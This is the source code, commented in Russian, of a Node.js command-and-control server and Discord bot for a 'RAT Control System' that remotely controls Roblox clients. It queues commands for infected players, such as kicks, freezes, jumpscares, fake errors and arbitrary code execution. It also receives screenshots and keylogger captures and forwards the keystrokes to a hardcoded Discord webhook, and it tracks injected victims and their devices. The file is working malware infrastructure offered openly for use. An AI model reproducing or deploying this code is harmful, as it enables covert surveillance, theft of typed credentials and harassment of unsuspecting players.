const http = require('http');
const fetch = require('node-fetch');
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');

// ========== КОНФИГУРАЦИЯ ==========
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
const PORT = process.env.PORT || 10000;

// Логирование конфигурации
console.log('🔧 Конфигурация сервера v3.0:');
console.log(`- PORT: ${PORT}`);
console.log(`- SERVER_URL: ${SERVER_URL}`);
console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
console.log(`- WEBHOOK_URL: ${WEBHOOK_URL ? '✅ Установлен' : '❌ Отсутствует'}`);

// ========== ХРАНИЛИЩЕ ДАННЫХ ==========
let commandQueue = []; // {command, args, target, timestamp}
let lastScreenshot = null;
global.onlineUsers = new Map();

// ========== DISCORD БОТ ==========
let discordClient = null;

if (DISCORD_TOKEN) {
    discordClient = new Client({ 
        intents: [
            GatewayIntentBits.Guilds,
            GatewayIntentBits.GuildMessages,
            GatewayIntentBits.MessageContent,
            GatewayIntentBits.GuildMembers
        ] 
    });

    // Функция отправки команды на сервер с таргетингом
    async function sendCommand(command, args = [], target = null) {
        try {
            const payload = {
                command: command,
                args: args
            };
            
            if (target) {
                payload.target = target;
            }
            
            const response = await fetch(`${SERVER_URL}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            console.log(`📨 Команда ${command} отправлена для ${target || 'всех игроков'}`);
            return response.ok;
        } catch (error) {
            console.error(`❌ Ошибка отправки команды ${command}:`, error.message);
            return false;
        }
    }

    // Получение списка онлайн пользователей
    async function getOnlineUsers() {
        try {
            const response = await fetch(`${SERVER_URL}/users`);
            if (response.ok) {
                return await response.json();
            }
            return { users: [], count: 0 };
        } catch (error) {
            console.error('❌ Ошибка получения пользователей:', error.message);
            return { users: [], count: 0 };
        }
    }

    // Функция для парсинга команды с таргетом
    function parseCommandWithTarget(message, expectedArgs = 0) {
        const args = message.content.slice(1).split(' ');
        const command = args.shift().toLowerCase();
        
        // Проверяем есть ли таргет (первое слово после команды может быть ником)
        let target = null;
        if (args.length > expectedArgs) {
            // Предполагаем что первый аргумент - ник, если он не похож на параметр команды
            const potentialTarget = args[0];
            if (!potentialTarget.match(/^\d+$/) && !potentialTarget.startsWith('-')) {
                target = args.shift();
            }
        }
        
        return { command, args, target };
    }

    // Обработчик событий Discord бота
    discordClient.on('ready', () => {
        console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
        console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
        console.log(`🎯 Версия: 3.0 (с таргетированными командами)`);
        
        discordClient.user.setActivity('RAT Control Panel v3.0', { type: 'WATCHING' });
    });

    // Обработка сообщений (старые команды через префикс /)
    discordClient.on('messageCreate', async message => {
        if (message.author.bot) return;
        
        if (message.content.startsWith('/')) {
            const { command, args, target } = parseCommandWithTarget(message);
            
            // Функция для создания embed с учетом таргета
            function createEmbed(title, description, color, targetText = null) {
                const embed = new EmbedBuilder()
                    .setTitle(title)
                    .setColor(color);
                
                if (targetText) {
                    embed.setDescription(`**Цель:** ${targetText}\n${description}`);
                } else {
                    embed.setDescription(description);
                }
                
                return embed;
            }
            
            // Словарь команд
            const commandHandlers = {
                test: async () => {
                    const text = target || "Тестовая команда от Discord бота! ✅";
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed(
                            '🧪 Тестовая команда',
                            'Сообщение отправлено игроку',
                            0x00ff00,
                            target
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                print: async () => {
                    if (await sendCommand("print", [], target)) {
                        const embed = createEmbed(
                            '📡 Проверка связи',
                            'Команда проверки связи отправлена',
                            0x00ff00,
                            target
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                users: async () => {
                    const data = await getOnlineUsers();
                    
                    if (data.count === 0) {
                        const embed = new EmbedBuilder()
                            .setTitle('👥 Онлайн пользователи')
                            .setDescription('❌ Нет активных пользователей')
                            .setColor(0xff0000);
                        message.reply({ embeds: [embed] });
                        return;
                    }
                    
                    const embed = new EmbedBuilder()
                        .setTitle('👥 Онлайн пользователи')
                        .setDescription(`**Всего пользователей:** ${data.count}`)
                        .setColor(0x00ff00)
                        .setTimestamp();
                    
                    // Группируем по играм
                    const games = {};
                    data.users.forEach(user => {
                        const game = user.place || 'Unknown';
                        if (!games[game]) games[game] = [];
                        games[game].push(user);
                    });
                    
                    for (const [game, users] of Object.entries(games)) {
                        const userList = users.slice(0, 5).map(u => 
                            `\`${u.player}\` (${u.executor || 'Unknown'})`
                        ).join('\n');
                        
                        embed.addFields({
                            name: `🎮 ${game} (${users.length})`,
                            value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
                            inline: false
                        });
                    }
                    
                    message.reply({ embeds: [embed] });
                },
                
                kick: async () => {
                    const reason = args.join(' ') || 'Нарушение правил';
                    if (await sendCommand("kick", [reason], target)) {
                        const embed = createEmbed(
                            '🦶 Кик',
                            `**Причина:** ${reason}`,
                            0xe74c3c,
                            target || 'Все игроки'
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                freeze: async () => {
                    let seconds = parseInt(args[0]) || 5;
                    seconds = Math.min(seconds, 60);
                    
                    if (await sendCommand("freeze", [seconds], target)) {
                        const embed = createEmbed(
                            '❄️ Заморозка',
                            `Длительность: \`${seconds}\` секунд`,
                            0x3498db,
                            target || 'Все игроки'
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                void: async () => {
                    if (await sendCommand("void", [], target)) {
                        const embed = createEmbed(
                            '🌀 Телепорт в бездну',
                            'Игрок телепортирован в бездну',
                            0x2c3e50,
                            target || 'Все игроки'
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                jumpscare: async () => {
                    let scareType = parseInt(args[0]) || 1;
                    const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                    const name = scareNames[scareType] || scareNames[1];
                    
                    if (await sendCommand("jumpscare", [scareType], target)) {
                        const embed = createEmbed(
                            `👻 Скример ${name}`,
                            '**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n\n⚠️ Приготовься к ужасу!',
                            0xff0000,
                            target || 'Все игроки'
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                message: async () => {
                    const text = args.join(' ');
                    if (!text) {
                        message.reply('❌ Укажите текст сообщения');
                        return;
                    }
                    
                    if (text.length > 100) {
                        message.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
                        return;
                    }
                    
                    if (await sendCommand("popup", [text], target)) {
                        const embed = createEmbed(
                            '📩 Сообщение отправлено',
                            `\`\`\`${text}\`\`\``,
                            0x3498db,
                            target || 'Все игроки'
                        );
                        message.reply({ embeds: [embed] });
                    }
                },
                
                // ... остальные команды с таргетингом
                
                help: async () => {
                    const helpEmbed = new EmbedBuilder()
                        .setTitle('🤖 RAT Control Panel v3.0')
                        .setDescription('Полный список команд с поддержкой таргетинга')
                        .setColor(0x7289da)
                        .addFields(
                            { 
                                name: '🎯 Как использовать таргетинг:', 
                                value: '`/команда ник аргументы`\nПример: `/kick Player123 Нарушение правил`\nЕсли ник не указан - команда для всех игроков', 
                                inline: false 
                            },
                            { 
                                name: '👤 Управление игроком', 
                                value: '`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '💬 Чат и сообщения', 
                                value: '`/message [ник] <текст>`\n`/chat [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '👻 Скримеры', 
                                value: '`/jumpscare [ник] <тип>`\n1-Джефф Килер, 2-Соник.exe', 
                                inline: false 
                            },
                            { 
                                name: '⚙️ Системные команды', 
                                value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/hardware [ник]`\n`/hide [ник]`', 
                                inline: false 
                            },
                            { 
                                name: '👥 Пользователи', 
                                value: '`/users` - Список онлайн игроков', 
                                inline: false 
                            }
                        )
                        .setFooter({ text: `Сервер: ${SERVER_URL} | Версия: 3.0` });
                    
                    message.reply({ embeds: [helpEmbed] });
                }
            };
            
            // Выполняем команду если она существует
            if (commandHandlers[command]) {
                try {
                    await commandHandlers[command]();
                } catch (error) {
                    console.error(`❌ Ошибка выполнения команды ${command}:`, error);
                    message.reply(`❌ Ошибка выполнения команды: ${error.message}`);
                }
            } else if (command) {
                message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\` для списка команд.`);
            }
        }
    });

    // Запуск Discord бота
    discordClient.login(DISCORD_TOKEN).then(() => {
        console.log('✅ Discord бот успешно авторизован');
    }).catch(error => {
        console.error('❌ Ошибка авторизации Discord бота:', error.message);
    });
} else {
    console.log('⚠️ DISCORD_TOKEN не установлен. Discord бот не будет запущен.');
}

// ========== СЕРВЕРНАЯ ЛОГИКА (v3.0 с таргетингом) ==========

// Очистка неактивных пользователей
function cleanupInactiveUsers() {
    const now = Date.now();
    for (let [key, user] of global.onlineUsers.entries()) {
        if (now - user.lastSeen > 60 * 1000) {
            global.onlineUsers.delete(key);
        }
    }
}

setInterval(cleanupInactiveUsers, 30 * 1000);

// Функция отправки в Discord webhook
async function sendDiscordMessage(title, description, color = 0x3498db, fields = []) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: "RAT Control System v3.0" }
                }]
            })
        });
    } catch (error) {
        console.error('Discord webhook error:', error.message);
    }
}

// Создание HTTP сервера
const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }
    
    // ========== V3.0: Получение команд для КОНКРЕТНОГО игрока ==========
    if (req.method === 'GET' && req.url.startsWith('/data')) {
        try {
            const url = new URL(req.url, `http://${req.headers.host}`);
            const player = url.searchParams.get('player');
            
            console.log(`📡 Клиент ${player || 'unknown'} запрашивает команды (в очереди: ${commandQueue.length})`);
            
            if (commandQueue.length > 0) {
                // Ищем команды для этого игрока или для всех
                const commandsForPlayer = [];
                const remainingCommands = [];
                
                for (const cmd of commandQueue) {
                    if (cmd.target === null || cmd.target === player || cmd.target === 'all') {
                        commandsForPlayer.push(cmd);
                    } else {
                        remainingCommands.push(cmd);
                    }
                }
                
                commandQueue = remainingCommands;
                
                if (commandsForPlayer.length > 0) {
                    const nextCommand = commandsForPlayer[0];
                    
                    console.log(`📤 Отправка команды ${nextCommand.command} игроку ${player}`);
                    
                    res.end(JSON.stringify({
                        command: nextCommand.command,
                        args: nextCommand.args
                    }));
                } else {
                    res.end(JSON.stringify({
                        command: "",
                        args: []
                    }));
                }
            } else {
                res.end(JSON.stringify({
                    command: "",
                    args: []
                }));
            }
        } catch (error) {
            console.error('Ошибка обработки /data:', error);
            res.statusCode = 500;
            res.end(JSON.stringify({ error: "Server error" }));
        }
        return;
    }
    
    // ========== V3.0: Отправка команды с таргетингом ==========
    if (req.method === 'POST' && req.url === '/command') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const command = data.command;
                const args = data.args || [];
                const target = data.target || null;
                
                console.log(`📨 Получена команда: ${command} для ${target || 'всех игроков'}`);
                
                // Добавляем команду в очередь с таргетом
                commandQueue.push({
                    command: command,
                    args: args,
                    target: target,
                    timestamp: Date.now()
                });

                // Логирование в Discord
                if (command === "inject_notify") {
                    await sendDiscordMessage(
                        "🔌 Новый инжект!",
                        `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}\n**Инжектор:** ${args[3]}\n**Устройство:** ${args[4]}`,
                        0x00ff00
                    );
                } else if (command === "user_chat") {
                    await sendDiscordMessage(
                        "💬 Чат игрока",
                        `**${args[0]}:** ${args[1]}`,
                        0x3498db
                    );
                } else if (command === "spam_completed") {
                    await sendDiscordMessage(
                        "✅ Spam операция завершена",
                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
                        0x00ff00
                    );
                } else if (command === "jumpscare") {
                    const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
                    await sendDiscordMessage(
                        "👻 Скример запущен!",
                        `**Тип:** ${scareNames[args[0]] || "Неизвестный"}`,
                        0xff0000
                    );
                }
                
                res.end(JSON.stringify({ 
                    status: "OK",
                    message: `Команда ${command} принята для ${target || 'всех игроков'}`
                }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // ========== ОСТАЛЬНЫЕ ЭНДПОИНТЫ ==========
    
    // Получение списка онлайн пользователей
    if (req.method === 'GET' && req.url === '/users') {
        cleanupInactiveUsers();
        const users = Array.from(global.onlineUsers.values());
        res.end(JSON.stringify({
            users: users,
            count: users.length
        }));
        return;
    }
    
    // Обновление информации о пользователе
    if (req.method === 'POST' && req.url === '/users') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { player, place, executor, device } = JSON.parse(body);
                global.onlineUsers.set(player, {
                    player: player,
                    place: place,
                    executor: executor,
                    device: device || "Unknown",
                    lastSeen: Date.now()
                });
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Скриншоты
    if (req.method === 'POST' && req.url === '/screenshot') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const { image } = JSON.parse(body);
                lastScreenshot = image;
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    if (req.method === 'GET' && req.url === '/screenshot') {
        res.end(JSON.stringify({ 
            image: lastScreenshot || null 
        }));
        return;
    }
    
    // Кейлоггер
    if (req.method === 'POST' && req.url === '/keylog') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { logs } = JSON.parse(body);
                await sendDiscordMessage(
                    "⌨️ Кейлоггер",
                    `\`\`\`${logs.slice(0, 1900)}\`\`\``,
                    0xe74c3c
                );
                res.end(JSON.stringify({ status: "OK" }));
            } catch (e) {
                res.statusCode = 400;
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }
    
    // Статус сервера
    if (req.method === 'GET' && req.url === '/status') {
        cleanupInactiveUsers();
        res.end(JSON.stringify({
            status: "online",
            version: "3.0.0",
            online_users: global.onlineUsers.size,
            pending_commands: commandQueue.length,
            discord_bot: discordClient && discordClient.user ? {
                username: discordClient.user.tag,
                status: "online",
                version: "3.0"
            } : { status: "disabled" }
        }));
        return;
    }
    
    // Информация о системе
    if (req.method === 'GET' && req.url === '/system_info') {
        res.end(JSON.stringify({
            name: "RAT Control System",
            version: "3.0.0",
            description: "Продвинутая система удаленного управления Roblox клиентами с таргетированными командами",
            server: SERVER_URL,
            features: [
                "Таргетированные команды для конкретных игроков",
                "Управление игроком (кик, заморозка, телепорт)",
                "Скример система (Джефф Килер, Соник.exe)",
                "Чат система с сообщениями",
                "Мониторинг устройств",
                "Кейлоггер",
                "Spam инструменты"
            ],
            discord_bot: discordClient && discordClient.user ? {
                username: discordClient.user.tag,
                status: "online",
                commands_count: 25,
                feature: "Таргетированные команды"
            } : { status: "disabled_no_token" }
        }));
        return;
    }
    
    // Корневой путь
    if (req.method === 'GET' && req.url === '/') {
        res.end(JSON.stringify({
            message: "RAT Control System v3.0",
            endpoints: [
                "/data?player=NAME - Получение команд для игрока",
                "/users - Онлайн пользователи",
                "/status - Статус системы",
                "/system_info - Информация о проекте"
            ],
            documentation: "Используйте /help в Discord для управления с таргетингом"
        }));
        return;
    }
    
    res.writeHead(404);
    res.end(JSON.stringify({ error: "Not Found", path: req.url }));
});

// Запуск HTTP сервера
server.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log(`🎯 Версия: 3.0 (с таргетированными командами)`);
    console.log('📡 Эндпоинты:');
    console.log('• GET  /data?player=NAME - Получение команд для конкретного игрока');
    console.log('• POST /command - Отправка команд (target для таргетинга)');
    console.log('• GET  /users - Список онлайн пользователей');
    console.log('• GET  /status - Статус сервера');
    console.log('• GET  /system_info - Информация о системе');
    console.log('');
    
    if (DISCORD_TOKEN) {
        console.log('💬 Discord команды готовы:');
        console.log('• /help - Список всех команд с таргетингом');
        console.log('• /kick [ник] <причина> - Кикнуть игрока');
        console.log('• /jumpscare [ник] <тип> - Скример для игрока');
        console.log('🎯 Формат: /команда ник аргументы');
    } else {
        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
    }
});
